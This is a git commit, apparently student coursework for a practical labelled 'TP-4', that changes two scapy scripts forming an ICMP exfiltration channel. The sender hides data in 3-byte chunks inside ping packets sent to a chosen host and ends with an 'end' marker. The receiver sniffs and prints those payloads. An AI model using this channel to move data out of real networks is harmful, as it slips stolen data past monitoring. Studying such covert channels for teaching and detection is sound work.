e9ae7efabfa8b5571f6182ca81596cfc824d597d
ninjawill543 <lucas.hanson@ynov.com>
2023-11-28 18:52:03 +0100

    lets try icmp exf receive bonus 1

--- TP-4/icmp_exf_receive_b1.py
+++ TP-4/icmp_exf_receive_b1.py
@@ -2,10 +2,11 @@ from scapy.all import sniff, ICMP
 
 def print_it_please(packet):
     if (packet['ICMP'].type == 8 and len(packet['Raw'].load) <= 3):
-        print(packet['Raw'].load)
-        if (packet['Raw'].load == "\\"):
+        if (packet['Raw'].load == "end"):
             quit()
-
+        else:
+            print(packet['Raw'].load)
+        
 sniff(filter="icmp", prn=print_it_please, count=0)
 
 #iface="" if you want to change interface for the sniff
--- TP-4/icmp_exf_send_b1.py
+++ TP-4/icmp_exf_send_b1.py
@@ -8,3 +8,8 @@ list = ([to_send[i:i + 3] for i in range(0, len(to_send), 3)])
 for i in list:
     packet = (IP(dst=sys.argv[1])/ICMP()/i)
     send(packet)
+
+
+end_value = "end"
+end = (IP(dst=sys.argv[1])/ICMP()/end_value)
+send(end)
